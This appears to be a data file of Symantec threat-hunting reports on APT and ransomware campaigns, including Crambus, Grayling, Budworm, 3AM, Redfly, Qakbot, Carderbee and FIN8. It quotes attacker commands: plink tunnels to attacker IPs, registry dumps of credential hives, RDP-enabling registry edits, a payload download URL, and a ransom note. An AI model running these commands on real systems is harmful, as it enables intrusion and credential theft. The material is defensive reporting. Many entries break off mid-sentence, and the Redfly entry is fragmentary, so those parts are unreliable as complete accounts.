            "{'tite': 'Crambus: New Campaign Targets Middle Eastern Government', 'Explanation': 'the iranian crambus espionage group (aka oilrig, apt34) staged an eight-month-long intrusion against a government in the middle east between february and september 2023. during the compromise, the attackers stole files and passwords and, in one case, installed a powershell backdoor (dubbed powerexchange) that was used to monitor incoming mails sent from an exchange server in order to execute commands sent by the attackers in the form of emails, and surreptitiously forwarded results\\xa0 to the attackers. malicious activity occurred on at least 12 computers and there is evidence that the attackers deployed backdoors and keyloggers on dozens more.in addition to deploying malware, the attackers made frequent use of the publicly available network administration tool plink to configure port-forwarding rules on compromised machines, enabling remote access via the remote desktop protocol (rdp). there is also evidence the attackers modified windows firewall rules in order to enable remote access.crambus is a long-running iranian espionage group that has mounted operations against targets in multiple countries, including saudi arabia, israel, the united arab emirates, iraq, jordan, lebanon, kuwait, qatar, albania, the u.s., and turkey.the group is known to stage long-running intrusions for intelligence gathering and spying purposes. in recent years it has added a heavy social engineering component to the early stages of its attacks.it most recently came to attention last year, when microsoft linked the group to a destructive attack against the albanian government. it assessed that crambus was involved in gaining initial access and exfiltrating data from impacted networks. wipers were likely then deployed by other iran-linked actors.\\xa0during this latest attack, crambus deployed three previously undiscovered pieces of malware, along with the powerexchange backdoor, a known backdoor that hadn’t yet been attributed to crambus. in addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools.the first evidence of malicious activity on the target’s network occurred on february 1, 2023, when an unknown powershell script (file name: joper.ps1) was executed from a suspicious directory: csidl_profile\\\\public\\\\sat. the same script was executed multiple times on the same computer (computer 1) over the next seven days.\\xa0four days later, on february 5, the attackers accessed a second computer (computer 2) and a renamed version of plink (msssh.exe), a command-line connection tool for the putty ssh client, was used to configure port-forwarding rules allowing for rdp access from a remote host:csidl_profile\\\\public\\\\sat\\\\msssh.exe 151.236.19[.]91 -p [removed]-c -n -r 0.0.0.0:54231:127.0.0.1:3389 -l [removed] -pw [removed]this masqueraded plink (mssh.exe) was executed repeatedly on this computer up until february 12.on february 21, malicious activity commenced on a web server (web server 1) when a netstat command was executed to retrieve a full list of all tcp and udp connections.netstat /anthe netstat command line switches perform the following actions:next, plink (mssh.exe) was launched again to enable remote rdp access. after this occurred, there was evidence that a powershell script was used to mount the c: drive of another computer on the network.on april 8, the attackers gained access to a third computer (computer 3), where\\xa0another variant of plink was executed from the %userprofile%\\\\public directory and was used to forward port 3389 to port 999 on all available interfaces:csidl_profile\\\\public\\\\plink.exe [removed] -pw [removed] -p [removed] -2 -4 -t -n -c -r 0.0.0.0:999:127.0.0.1:3389the options supplied in the command perform the following actions:at the same time, an unknown batch file was executed, which redirected output to a text file in the %userprofile%\\\\public directory.cmd /c csidl_profile\\\\public\\\\p2.bat > csidl_profile\\\\public\\\\001.txt 2>&1immediately afterwards, the same plink command was run a second time.\\xa0this is followed by the same unknown batch script being executed several more times.later that day, mimikatz was executed from the %temp% directory to dump credentials.on april 9, another netstat command was run on a new compromised computer, the domain controller (computer 4):netstat /aonthe “o” option adds the process id (pid) of the associated process that\\'s using each network connection or listening port. the command will provide a list of all active network connections, both incoming and outgoing, along with the associated pid of the processes using those connections. three hours later, mimikatz was run again to dump credentials.the next day, april 10, an unknown windows batch file (file name: p.bat) was executed on computer 3. this was followed by a plink command:\\xa0plink.exe ssh 78.47.218[.]106 1234qwerrr 443 10999 10.75.45.222 3389the options perform the following actions:the command is used to set up a port forwarding tunnel from the compromised machine as a means to access the remote server’s rdp service as if it was running locally.\\xa0on april 23, activity resumed on computer 3, when previously unseen malware named backdoor.tokel (file name: telecomm.exe) was executed.\\xa0on may 7, a suspicious powershell command was executed on the domain controller (computer 4) to run an unknown script (file name: hwf.ps1).malicious activity appeared to cease for nearly a month until june 4, when backdoor.tokel was executed again on computer 3. on june 17, a suspicious powershell command was executed on the domain controller (computer 4) in order to run another unknown script (file name: zone.ps1).on june 20, backdoor.powerexchange (file name: setapp.ps1) was run on computer 3.the powershell-based backdoor is designed to execute commands received from the attackers. this is done by logging into compromised mailboxes on an exchange server and monitoring for incoming emails from the attackers. email’s that contain “@@” in the subject line are read by backdoor.powerexchange and have the ability to execute commands received from the attackers, effectively using the exchange server as a c&c.the script allows four commands to execute:the attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an exchange server are expected behavior.\\xa0on july 1, the attackers once again utilized the masqueraded version of plink to open a tunnel on computer 3 by redirecting rdp to port 12345 on any listening interface, effectively allowing external connections over rdp to the compromised machine. the next day, july 2, the attackers used netstat to list all open and listening tcp and udp ports. it\\'s possible the attackers were checking that the ssh tunnel was still active.on july 8, the attackers used the domain controller (computer 4) to create a service on a remote host (10.75.45[.]222) to run an unknown script (file name: pl.bat). the service was configured to auto-start during the boot up process.\\xa0over the next two days, july 9 and 10, another new piece of malware named trojan.dirps (file name: virtpackage.exe) was repeatedly executed on computer 3.\\xa0on july 11, the attackers introduced more malicious tools to computer 3, installing a third new piece of malware named infostealer.clipog (file name (poluniq.exe) which is used to capture keystrokes and steal clipboard contents.\\xa0the next day (july 12) the attackers ran mimikatz on the domain controller (computer 4) to dump credentials.\\xa0on july 15, the attackers again ran the unknown powershell script (zone.ps1) on the domain controller (computer 4), followed by a second unknown script (copy.ps1).\\xa0on july 18, the attackers again executed infostealer.clipog on computer 3 before creating an ssh tunnel using plink to access rdp services. this ssh tunnel was created again on august 3.on august 6, yet another unknown powershell script (file name: tnc.ps1) was executed on the domain controller (computer 4). immediately afterwards, nessus vulnerability scans were observed, specially hunting for log4j vulnerabilities on other machines on the network. while this could have been legitimate vulnerability scanning activity, not long afterwards netsh was executed to list all firewall rules.\\xa0csidl_system\\\\netsh.exe advfirewall firewall show rule name=[removed] verbosefollowing this, another powershell script was executed. the script appeared to be designed to query and collect information about local user groups and their members on a windows system. its output was information about sids, names, object classes, and principal sources of local user groups and their members in a structured format.\\xa0csidl_system\\\\windowspowershell\\\\v1.0\\\\powershell -noprofile -command ;& {$j = sajb {$erroractionpreference = \\'silentlycontinue\\';$groups = get-localgroup | select-object name, domain, sid;foreach($g in $groups){-join($g.sid,\\'|\\',$g.name);$members = get-localgroupmember -sid $g.sid | select *;foreach($m in $members){-join(\\' \\',$m.sid,\\'|\\',$m.name,\\'|\\',$m.objectclass,\\'|\\',$m.principalsource);}}};$r = wjb $j -timeout 300; rcjb $j;};after this, net.exe was used to list all mapped drives, before wmi (windows management instrumentation) was used to execute plink in order to open port-forwarding on the compromised host, allowing for remote rdp access.on august 7 and again on august 12, plink was downloaded from the internet on to the domain controller (computer 4) and saved as \\\\programdata\\\\adobe.exe.\\xa0on august 30, the attackers obtained access to a second web server (web server 2). they first used plink to enable access to rdp on port 12345 from their c&c server (91.132.92[.]90). they then installed infostealer.clipog using a different file name (fs-tool.exe).\\xa0the next day, august 31, the attackers established a tunnel once again to open rdp access on port 4455 from their c&c. output was redirected to a text file (file name: 001.txt). there may have been some issues connecting as the attackers later attempted to create the same tunnel, this time using port 12345.on september 1, the attackers shifted their attention to three more computers (computer 5, computer 6 and computer 7), using certutil to download plink to each machine. they then executed an unknown powershell script (file name: joper.ps1) on web server 2.\\xa0on september 2, the attackers ran the following netstat command on web server 2:netstat -athis command is used to list all active connections. the unknown powershell script (file name: joper.ps1) was then run again.on september 3, the attackers once again ran joper.ps1 before two suspicious wireshark commands were executed:;csidl_system_drive\\\\program files\\\\wireshark\\\\extcap\\\\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0;csidl_system_drive\\\\program files\\\\wireshark\\\\dumpcap.exe; -d -z nonewireshark’s usbcapcmd utility was used to capture usb traffic on specified usb devices and save the captured data to a file. similarly, dumpcap was used to capture network packets.usbpcapcmd:dumpcap:it appears the attackers were interested in identifying any available network or usb interfaces from which they could capture packets on the machine.\\xa0immediately afterwards, a suspicious netstat command ran:netstat -a –nthis will list all active connections and print them to standard output in numerical form.after joper.ps1 was once again executed, the attackers turned their attention back to computer 3, where they ran a number of reg.exe commands:reg.exe add ;hkey_local_machine\\\\system\\\\curentcontrolset\\\\control\\\\terminal server; /v fdenytsconnections /t reg_dword /d 0 /freg.exe add ;hkey_local_machine\\\\system\\\\curentcontrolset\\\\control\\\\terminal server; /v fdenytsconnections /t reg_dword /d 0 /freg.exe add ;hkey_local_machine\\\\system\\\\curentcontrolset\\\\control\\\\terminal server; /v fdenytsconnections /t reg_dword /d 0 /fcmd.exe /c reg.exe add ;hkey_local_machine\\\\system\\\\curentcontrolset\\\\control\\\\terminal server; /v fdenytsconnections /t reg_dword /d 0 /fcmd.exe /c reg.exe add ;hkey_local_machine\\\\system\\\\curentcontrolset\\\\control\\\\terminal server; /v fdenytsconnections /t reg_dword /d 0 /fthese commands were used to modify system configuration to enable terminal services (i.e. remote access) to the computer via rdp.a few hours later, a suspicious net.exe command was executed to mount the c$ share of another machine using stolen credentials.;csidl_system\\\\net.exe; use \\\\\\\\[removed]\\\\c$ /user:[removed] [removed]on september 4, the attackers executed three different variants of the joper.ps1 script on web server 2. they then turned their attention back to computer 1, where a new variant of the backdoor.tokel malware was installed on the computer.\\xa0the next day, september 5 the attackers once again ran the joper.ps1 script on web server 2, while using net.exe to mount and unmount various network shares. they then executed backdoor.tokel on computer 3 again before installing it on two more computers (computer 9 and computer 10).\\xa0malicious activity continued until september 9, with the attackers largely focusing their attention on web server 2, running the joper.ps1 script and mounting/unmounting network shares.crambus is a long-running and experienced espionage group that has extensive expertise in carrying out long campaigns aimed at targets of interest to iran. after a 2019 leak of its toolset, there was some speculation that crambus may disappear. however, its activities over the past two years demonstrate that it represents a continuing threat for organizations in

            "{'tite': 'Grayling: Previously Unseen Threat Actor Targets Multiple Organizations in Taiwan', 'Explanation': 'a previously unknown advanced persistent threat (apt) group used custom malware and multiple publicly available tools to target a number of organizations in the manufacturing, it, and biomedical sectors in taiwan.a government agency located in the pacific islands, as well as organizations in vietnam and the u.s., also appear to have been hit as part of this campaign. this activity began in february 2023 and continued until at least may 2023.the symantec threat hunter team, part of broadcom, has attributed this activity to a new group we are calling grayling. this activity stood out due to the use by grayling of a distinctive dll sideloading technique that uses a custom decryptor to deploy payloads. the motivation driving this activity appears to be intelligence gathering.there are indications that grayling may exploit public facing infrastructure for initial access to victim machines. web shell deployment was observed on some victim computers prior to dll sideloading activity taking place. dll sideloading is used to load a variety of payloads, including cobalt strike, netspy, and the havoc framework.\\xa0the attackers take various actions once they gain initial access to victims’ computers, including escalating privileges, network scanning, and using downloaders.tactics, techniques, and procedures (ttps) used by the attackers included:\\xa0the typical attack chain in this activity appears to be dll sideloading through exported api sbiedll_hook. this leads to the loading of various tools, including a cobalt strike stager that leads to cobalt strike beacon, the havoc framework, and netspy. the attackers were also seen loading and decrypting an unknown payload from imfsb.ini. an exploit for cve-2019-0803 was also used in the course of this activity, while shellcode was also downloaded and executed.other post-exploitation activity performed by these attackers includes using kill processes to kill all processes listed in a file called processlist.txt, and downloading the publicly available credential-dumping tool mimikatz.while we do not see data being exfiltrated from victim machines, the activity we do see and the tools deployed point to the motivation behind this activity being intelligence gathering. the sectors the victims operate in – manufacturing, it, biomedical, and government – are also sectors that are most likely to be targeted for intelligence gathering rather than for financial reasons.\\xa0the use of custom techniques combined with publicly available tools is typical of the activity we see from apt groups these days, with threat actors often using publicly available or living-off-the-land tools in attempts to bypass security software and help their activity stay under the radar of defenders. tools like havoc and cobalt strike are also frequently used by attackers due to their wide array of capabilities. it is often easier for even skilled attackers to use existing tools like this than to develop custom tools of their own with similar capabilities. the use of publicly available tools can also make attribution of activity more difficult for investigators. the steps taken by the attackers, such as killing processes etc., also indicate that keeping this activity hidden was a priority for them.we have not been able to definitively link grayling to a specific geography, but the heavy targeting of taiwanese organizations does indicate that they likely operate from a region with a strategic interest in taiwan.\\xa0\\xa0for the latest protection updates, please visit the\\xa0symantec protection bulletin.\\xa0if an ioc is malicious and the file available to us, symantec endpoint

            "{'tite': 'Budworm: APT Group Uses Updated Custom Tool in Attacks on Government and Telecoms Org', 'Explanation': 'the budworm advanced persistent threat (apt) group continues to actively develop its toolset. most recently, the threat hunter team in symantec, part of\\xa0broadcom,\\xa0discovered budworm using an updated version of one of its key tools to target a middle eastern telecommunications organization and an asian government.both attacks\\xa0occurred in august 2023. budworm (aka luckymouse, emissary panda, apt27)\\xa0deployed a previously unseen variant of its sysupdate backdoor (sysupdate dll inicore_v2.3.30.dll). sysupdate is exclusively used by budworm.\\xa0as well as\\xa0its\\xa0custom malware, budworm also used a variety of living-off-the-land and publicly available tools in these attacks. it appears the activity by the group may have been stopped early in the attack chain as the only malicious activity seen on\\xa0infected\\xa0machines is credential harvesting.\\xa0budworm executes sysupdate on victim networks by dll sideloading the payload using the legitimate inisafewebsso application. this technique has been used by the group\\xa0for some time, with\\xa0reports of inisafewebsso being leveraged\\xa0dating as far back as 2018. dll sideloading attacks use the dll search order mechanism in windows to plant and then invoke a legitimate application that executes a malicious payload. it can help attackers evade detection.sysupdate is a feature-rich backdoor that has multiple capabilities, including:\\xa0trend micro reported in march 2023 that budworm had developed a linux version of sysupdate with similar capabilities to the windows version. sysupdate has been in use by budworm since at least 2020, and the attackers appear to continually develop the tool to improve its capabilities and avoid detection.as well as sysupdate, the attackers used a number of legitimate or publicly available tools to map the network and dump credentials. tools used by the attackers in this campaign included:\\xa0budworm is a long-running apt group that is believed to have been active since at least 2013. the attackers are known for their targeting of high-value victims, often focusing on organizations in the government, technology, and defense sectors. budworm has targeted victims in many countries in southeast asia and the middle east, among other locations, including the u.s.\\xa0symantec’s threat hunter team published a blog in october 2022 detailing how budworm activity was seen on the network of a u.s. state legislature. in that campaign, the attackers also targeted the government of a middle eastern country, a multinational electronics manufacturer, and a hospital in southeast asia. the attackers also leveraged dll sideloading in that campaign to load their hyperbro malware.the victims in this campaign — a government in asia and a telecommunications company in the middle east — do align with the kinds of victims we often see budworm targeting. the targeting of a telecommunications company and government also point to the motivation behind the campaign being intelligence gathering, which is the motivation that generally drives budworm activity.that budworm continues to use a known malware (sysupdate), alongside techniques it is known to favor, such as dll sideloading using an application it has used for this purpose before, indicate that the group isn’t too concerned about having this activity associated with it if it is discovered.\\xa0the use of a previously unseen version of the sysupdate tool also demonstrates that the group is continuing to actively develop its toolset. the fact that this activity occurred as recently as august 2023 suggests that the group is currently active, and that those organizations that may be of interest to budworm should be aware of this activity and the group’s current toolset.\\xa0\\xa0for the latest protection updates, please visit

            "{'tite': '3AM: New Ransomware Family Used As Fallback in Failed LockBit Attack', 'Explanation': 'a new ransomware family calling itself 3am has emerged. to date, the ransomware has only been used in a limited fashion. symantec’s threat hunter team, part of broadcom, has seen it used in a single attack by a ransomware affiliate that attempted to deploy lockbit on a target’s network and then switched to 3am when lockbit was blocked.3am is written in rust and appears to be a completely new malware family. the ransomware attempts to stop multiple services on the infected computer before it begins encrypting files. once encryption is complete, it attempts to delete volume shadow (vss) copies. it is still unclear whether its authors have any links to known cybercrime organizations.\\xa0the first suspicious activity from the threat actor involved the use of the gpresult command to dump the policy settings enforced on the computer for a specified user. the attacker also executed various cobalt strike components and tried to escalate privileges on the computer using psexec.the attackers then ran reconnaissance commands such as whoami, netstat, quser, and net share, and tried to enumerate other servers for lateral movement with the quser and net view commands. they also added a new user for persistence and used the wput tool to exfiltrate the victims’ files to their own ftp server.the attackers first attempted to use the lockbit ransomware but when that was blocked, they resorted to 3am instead. the use of 3am was only partially successful. the attackers only managed to deploy it to three machines on the organization\\'s network and it was blocked on two of those three computers.3am is so-called because it appends encrypted files with the extension .threeamtime. the ransom note also makes reference to 3am:hello. \"3 am\" the time of mysticism, isn\\'t it?all your files are mysteriously encrypted, and the systems \"show no signs of life\", the backups disappeared. but we can correct this very quickly and return all your files and operation of the systems to original state.all your attempts to restore data by himself will definitely lead to their damage and the impossibility of recovery. we are not recommended to you to do it on our own!!!

            "{'tite': 'Redfly: Espionage Actors Continue to Target Critical Infrastructure', 'Explanation': 'espionage actors are continuing to mount attacks on critical national infrastructure (cni) targets, a trend that has become a source of concern for governments and cni organizations worldwide. symantec’s threat hunter team has found evidence that a threat actor group symantec calls redfly used the shadowpad trojan to compromise a national grid in an asian country for as long as six months earlier this year. the attackers managed to steal credentials and compromise multiple computers on the organization’s network.\\xa0the attack is the latest in a series of espionage intrusions against cni targets. in may 2023, the u.s., uk, australian, canadian, and new zealand governments issued a joint alert about threat actors targeting cni organizations in the u.s. using techniques that could potentially be replicated against targets in other countries. the alert followed microsoft’s report on volt typhoon, an espionage actor that compromised several critical infrastructure organizations in the u.s.shadowpad is a modular remote access trojan (rat) that was designed as a successor to the korplug/plugx trojan, and was, for a period of time, sold in underground forums. however, despite its origins as a publicly available tool, it was only sold publicly for a very short time reportedly to a handful of buyers. it has since been closely linked to espionage actors.\\xa0while shadowpad is known to be used by multiple advanced persistent threat (apt) actors, identified tools and infrastructure used in the recent campaign targeting a national power grid overlaps with previously reported attacks attributed to a cluster of apt41 activity (aka brass typhoon, wicked panda, winnti, and red echo). symantec tracks this group under as multiple distinct actors such as blackfly and grayfly, where links between these groups have been discussed before. the activities identified in this campaign are currently being tracked under a separate group that symantec has dubbed redfly, which appears to exclusively focus on targeting cni.\\xa0a distinct variant of the shadowpad trojan was used in this attack. it utilized the domain websencl[.]com for command-and-control (c&c) purposes.\\xa0it copied itself to disk in the following locations, masquerading as vmware files and directories to mask its purpose (there is no other evident association with vmware products):persistence is achieved by creating the following service that is configured to start with windows on boot-up:servicename: vmware snapshot provider servicedisplayname: vmware snapshot provider serviceservicetype: service_win32_own_process|service_interactive_processstarttype: service_auto_startbinarypathname: c:\\\\programdata\\\\vmware\\\\rawdskcompatibility\\\\virtual\\\\vmrawdsk.exethis is a tool used to load and execute shellcode. the shellcode is stored in a file in an encrypted form. it allows the attackers to deliver and execute arbitrary files or commands on an infected computer.the tool is a 64-bit dynamic link library (dll) that has one export, called workproc, which accepts an additional command-line argument. this argument is interpreted as a string and can be used as a decryption key. if no key is passed on the command line, the malware attempts to retrieve a key from the following registry location instead:in all cases, the malware checks that the string length of the decryption secret is 0x20 characters.the malware then loads its payload. it will first check if the following file exists:if the file exists, its contents are used as the encrypted payload. otherwise, the malware attempts to retrieve a payload from the registry at the following location:\\xa0the malware will then decrypt the loaded payload with the advanced encryption standard (aes) algorithm in electronic code book (ecb) mode using the first 0x10 bytes of the decryption key as the aes key. finally, it creates a new thread to execute the decrypted payload as shellcode.\\xa0the attackers also employed a keylogger, which was installed under various file names on different computers, including winlogon.exe and hphelper.exe.the keylogger was configured to store captured keystrokes in the following location:the first evidence of intrusion on the targeted network dated from february 28, 2023, when shadowpad was executed on a single computer. it was executed again on may 17 2023, suggesting that the attackers had maintained a presence in the intervening three months.\\xa0a day earlier (may 16), a suspicious windows batch file (file name: 1.bat) was executed. shortly afterwards, packerloader was executed via rundll32 from the %temp% directory with some command-line arguments:rundll32 %temp\\\\%packerloader.dll workproc e10adc3949ba59abbe56e057f20f883eimmediately afterwards, permissions were modified for a driver file called dump_diskfs.sys to grant access to all users. it is possible the attackers used this driver to create dumps of the file system for later exfiltration. four minutes later, credentials were dumped from the windows registry:reg save hklm\\\\system system.savereg save hklm\\\\sam sam.savreg save hklm\\\\security security.saveon may 19, the attackers returned, running packerloader and the 1.bat batch file again. shortly afterwards, a legitimate binary named displayswitch.exe was executed. it was likely being used to perform dll side-loading. this involves the attackers placing a malicious dll in a directory where a legitimate dll is expected to be found. the attacker then runs the legitimate application (having installed it themselves). the legitimate application then loads and executes the payload.several hours later a suspicious powershell command was executed and used to gather information on the storage devices attached to the system. specifically it was designed to look for drivetype=3 (read/write supported) and gather details on available space.\\xa0powershell -executionpolicy bypass -command \"$disks = get-wmiobject win32_logicaldisk -filter \\\\\" drivetype = 3\\\\\"

activity occurred again.on may 26, displayswitch.exe was executed from the %temp% directory via the command prompt. less than an hour later, several commands were executed via displayswitch.exe to dump credentials from the registry and clear the windows security event logs:csidl_system\\\\cmd.exereg save hklm\\\\sam sam.savereg save hklm\\\\system system.savereg save hklm\\\\system

mostly likely to perform side-loading and laterally movement. use of oleview by shadowpad has been previously documented by dell secureworks and was also reported to have been used in attacks against industrial control systems. the command specified that oleview was to be executed on a remote machine using the task name (tendview) at 07:30 a.m. it appears the attackers likely used stolen

europe. more recently, the russian sandworm group mounted attacks against the electricity distribution network in ukraine, which were directed at disrupting electricity supplies.\\xa0however, the frequency at which cni organizations are being attacked appears to have increased over the past year and is now a source of concern. threat actors maintaining a long-term, persistent presence on a national grid presents a clear risk of attacks designed to disrupt power supplies and other vital services in nation-states during times of increased political tension. while symantec has not seen any disruptive activity by redfly, the fact that such attacks have occurred in other regions means they are not outside the bounds of possibility.\\xa0for the latest protection updates, please visit the

            "{'tite': 'Qakbot: Takedown Operation Dismantles Botnet Infrastructure ', 'Explanation': \"a major international law enforcement operation has disrupted the notorious qakbot botnet and taken much of its infrastructure offline. led by the u.s. federal bureau of investigation (fbi) and justice department and involving agencies from france, germany, the netherlands, the uk, romania, and latvia, the operation has resulted in the deletion of the qakbot malware from more than 700,000 victim’s computers and the seizure of $8.6 million in cryptocurrency that is suspected to be the profit of cybercrime.\\xa0the takedown operation saw the fbi obtaining access to qakbot infrastructure, which allowed it to identify more than 700,000 infections and redirect the botnet’s traffic to servers controlled by the agency. an uninstaller was then distributed that removed the infected computers from the botnet.qakbot is operated by a cybercrime group symantec, part of broadcom, calls batbug. the malware is one of the most enduring threats, having first appeared in 2007. like several similar malware families, qakbot started life as a banking trojan and, aside from its prevalence, it became known for its functionality and adaptability. for example, once it infected one machine in an organization, it was able to spread laterally across networks utilizing a worm-like functionality through brute-forcing network shares and active directory user group accounts, or via server message block (smb) exploitation.\\xa0qakbot is largely spread via email. while it was once delivered by the emotet botnet, qakbot is now usually delivered directly via email spam runs, suggesting its operators acquired access to spamming infrastructure following emotet’s disappearance. these emails may include a malicious link or attachment, and the subject lines generally refer to popular lure subjects such as shipping updates, work orders, urgent requests, invoices, and claims.in recent years, qakbot has become closely associated with ransomware activity with qakbot infections acting as the initial breach that ultimately leads to ransomware deployment on an organization’s network. qakbot has been associated with multiple ransomware operations in recent years, including sodinokibi, egregor, prolock, and mountlocker. most recently, it has been seen collaborating with the blackbasta ransomware operation.\\xa0activity by qakbot stepped up significantly from january 2023, when its malicious emails leveraged microsoft onenote attachments to drop qakbot on infected machines. onenote is a desktop digital notebook application that is installed by default in all microsoft office/365 installations. even if a windows user does not typically use the application, it is still available to open the file format.\\xa0the malicious emails contained an embedded url. when clicked, it leads to a zip archive that contains a malicious onenote file. clicking on this file leads to the execution of an html application (hta) file that ultimately leads to a qakbot dll being downloaded onto a victim’s machine. it is downloaded as a .png file via curl before being loaded by rundll32.exe.\\xa0there were indications in at least one qakbot attack observed by symantec that the initial access vector may have been malvertising. the attack chain in that instance began with the victim visiting a malicious website on the chrome browser. this coincided with reports about malware, including icedid, being spread via ads on google.\\xa0this surge in qakbot activity appeared to last until june 2023. the attackers made frequent tweaks to their attack chain, likely in a bid to evade detection. onenote files were eventually abandoned and by june the attackers were largely favoring pdf documents, which led to urls from which malicious zip archives containing javascript downloaders were downloaded.\\xa0it is unclear yet whether qakbot's sudden cessation of activity in june was linked to this takedown operation.batbug has long been one of the largest players in the cybercrime landscape, controlling a lucrative malware distribution network that was linked to multiple major ransomware gangs. this takedown is likely to disrupt batbug’s operations and it is possible that the group may struggle to rebuild its infrastructure in its aftermath.for the latest protection updates, please visit the symantec protection bulletin.the threat hunter team is a group of security experts within symantec whose mission is to investigate targeted attacks, drive enhanced protection in symantec products, and offer analysis that helps customers respond to attacks.we encourage you to share your thoughts on your favorite social platform.\"}\n",
            "{'tite': 'Carderbee: APT Group use Legit Software in Supply Chain Attack Targeting Orgs in Hong Kong', 'Explanation': '\\xa012.20pm bst, 22 august 2023: updated with additional iocsa previously unknown advanced persistent threat (apt) group used the legitimate cobra docguard software to carry out a supply chain attack with the goal of deploying the korplug backdoor (aka plugx) onto victim computers.in the course of this attack, the attackers used malware signed with a legitimate microsoft certificate. most of the victims in this campaign are based in hong kong, with some victims based in other regions of asia.korplug is known to be used by multiple apt groups, but we could not link this activity to a known threat actor so we have given the actor behind this activity a new name — carderbee.\\xa0\\xa0cobra docguard client is software produced by a china-based company called esafenet and appears to legitimately be used to protect, encrypt, and decrypt software. esafenet is owned by chinese information security firm nsfocus.according to a report from eset, in september 2022, a malicious update to this software was used to compromise a gambling company in hong kong. the same gambling company had been compromised in september 2021 using the same technique by budworm (aka luckymouse, apt27), which led eset to attribute this september 2022 attack to budworm too. in that attack, a new variant of the korplug malware was also found. in that instance, it used the magic header “eset”, indicating that it may have been modified to try to bypass eset products.a signed version of korplug was also used in the activity investigated by the symantec threat hunter team, part of broadcom. this activity began in april 2023. however, we did not find any other evidence to indicate that this attack was carried out by budworm. korplug is a backdoor that is known to be used by multiple apts, including apt41 and budworm. we do not have any indication of the industry sectors of the companies targeted in this recent activity, just their geographic location.accordingly, it was not possible to link this activity definitively to a known group, which is why we attributed it to a new group, carderbee.\\xa0malicious activity was seen on about 100 computers in impacted organizations; however, the cobra docguard software was installed on around 2,000 computers, indicating that the attacker may be selectively pushing payloads to specific victims.the malicious software was delivered to the following location on infected computers, which is what indicates that a supply chain attack or malicious configuration involving cobra docguard is how the attackers compromised affected computers:\"csidl_system_drive\\\\program files\\\\esafenet\\\\cobra docguard client\\\\update\"over a period of a few months in 2023, multiple distinct malware families were observed being deployed via this method. in one interesting case, a downloader deployed by the attackers had a digitally signed certificate from microsoft, called microsoft windows hardware compatibility publisher. this downloader was used to install the korplug backdoor on targeted systems. the downloader attempted to download a file named update.zip from the following location: http://cdn.stream-amazon[.]com/update.zip.the update.zip file is a zlib compressed archive file. it decompresses and executes a file named content.dll. this file is not saved on disk. it acts as a dropper and contains x64 and x86 drivers, which are dropped depending on the system environment. the dropper creates services and registry entries. the dropped drivers read encrypted data from the registry, decrypt it, and inject it into svchost.exe. the injected payload is the korplug backdoor.\\xa0the korplug sample downloaded here is able to:\\xa0use of microsoft-signed malware is a known problem. in december 2022, mandiant noted a poortry driver sample signed with a microsoft windows hardware compatibility authenticode signature. most recently, in july 2023, trend said that it had found a microsoft-signed rootkit that appeared to have passed through the windows hardware quality labs (whql) process for getting a valid signature. microsoft acknowledged the issue and said that drivers certified by microsoft’s windows hardware developer program (mwhdp) were being used maliciously in post-exploitation activity.\\xa0the company said it had investigated the issue and “determined that the activity was limited to the abuse of several developer program accounts and that no microsoft account compromise has been identified.” malware signed with what appears to be a legitimate certificate can make it much harder for security software to detect.\\xa0it seems clear that the attackers behind this activity are patient and skilled actors. they leverage both a supply chain attack and signed malware to carry out their activity in an attempt to stay under the radar. the fact that they appear to only deploy their payload on a handful of the computers they gain access to also points to a certain amount of planning and reconnaissance on behalf of the attackers behind this activity. software supply chain attacks remain a major issue for organizations in all sectors, with multiple high-profile supply chain attacks occurring in the last 12 months, including the moveit, x_trader, and 3cx attacks.some unanswered questions remain about the activity of carderbee, such as what sectors the group was targeting with this activity, and whether there are any links between carderbee and other actors such as budworm.\\xa0symantec researchers will continue to track this activity, and we share indicators of compromise below so our colleagues in the security community can do so as well.\\xa0for the latest protection updates, please visit the symantec protection bulletin.\\xa0if an ioc is malicious and the file available to us, symantec endpoint products

            "{'tite': 'FIN8 Uses Revamped Sardonic Backdoor to Deliver Noberus Ransomware', 'Explanation': 'symantec’s threat hunter team, a part of broadcom, recently observed the syssphinx (aka fin8) cyber-crime group deploying a variant of the sardonic backdoor to deliver the noberus ransomware.\\xa0while analysis of the backdoor revealed it to be part of the sardonic framework previously used by the group, and analyzed in a\\xa02021 report from bitdefender, it seems that most of the backdoor’s features have been altered to give it a new appearance.\\xa0active since at least january 2016, syssphinx (aka fin8) is a financially motivated cyber-crime group known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemicals, and finance sectors.\\xa0the group is known for utilizing so-called living-off-the-land tactics, making use of built-in tools and interfaces such as powershell and wmi, and abusing legitimate services to disguise its activity. social engineering and spear-phishing are two of the group’s preferred methods for initial compromise.while syssphinx initially specialized in point-of-sale (pos) attacks, in the past few years the group has been observed using a number of ransomware threats in its attacks.in june 2021, syssphinx was seen deploying the ragnar locker ransomware onto machines it had compromised in a financial services company in the u.s. earlier in the year. the activity marked the first time the group was observed using ransomware in its attacks. ragnar locker is developed by a financially motivated cyber-crime group symantec calls hornworm (aka viking spider).\\xa0in january 2022, a family of ransomware known as white rabbit was linked to syssphinx. a malicious url linked to white rabbit attacks was also linked to syssphinx. in addition, attacks involving white rabbit used a variant of the sardonic backdoor, a known syssphinx tool.in december 2022, symantec observed the group attempting to deploy the noberus\\xa0(aka alphv, blackcat) ransomware in attacks. noberus is operated by a financially motivated cyber-crime group symantec calls coreid (aka blackmatter, carbon spider, fin7).the syssphinx group’s move to ransomware suggests the threat actors may be diversifying their focus in an effort to maximize profits from compromised organizations.\\xa0syssphinx is known for taking extended breaks between attack campaigns in order to improve its tactics, techniques, and procedures (ttps).\\xa0for instance, since 2019, syssphinx had used backdoor malware called badhatch in attacks. syssphinx updated badhatch in december 2020 and then again in january 2021. then in august 2021, bitdefender researchers published details of a new backdoor dubbed sardonic and linked it to the same group. the c++-based sardonic backdoor has the ability to harvest system information and execute commands, and has a plugin system designed to load and execute additional malware payloads delivered as dlls.\\xa0the syssphinx attack observed by symantec in december 2022, in which the attackers attempted to deploy the noberus ransomware, involved similar techniques as a syssphinx attack\\xa0described by bitdefender researchers in 2021.\\xa0however, the most recent attack had some key differences, including the final payload being the noberus ransomware and the use of a reworked backdoor.the revamped sardonic backdoor analyzed in this blog shares a number of features with the c++-based sardonic backdoor analyzed by bitdefender. however, most of the backdoor’s code has been rewritten, such that it gains a new appearance. interestingly, the backdoor code no longer uses the c++ standard library and most of the object-oriented features have been replaced with a plain c implementation.\\xa0in addition, some of the 